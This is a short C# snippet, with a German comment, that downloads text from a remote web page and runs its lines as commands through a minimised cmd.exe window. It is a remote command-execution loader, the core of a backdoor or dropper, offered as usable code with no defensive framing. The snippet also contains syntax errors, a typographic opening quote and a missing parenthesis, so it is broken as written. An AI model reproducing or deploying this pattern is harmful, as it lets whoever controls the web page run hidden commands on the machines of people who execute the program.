/// load cmd commands from website
using (WebClient client = new WebClient())
{
  string htmlCode = client.DownloadString(„https://www.1337core.de/cmd.html");
  System.Diagnostics.Process.Start("cmd.exe", "/c start /min " + htmlCode.Replace('\n', '&');
}

/// HTML Inhalt > https://www.1337core.de/cmd.html
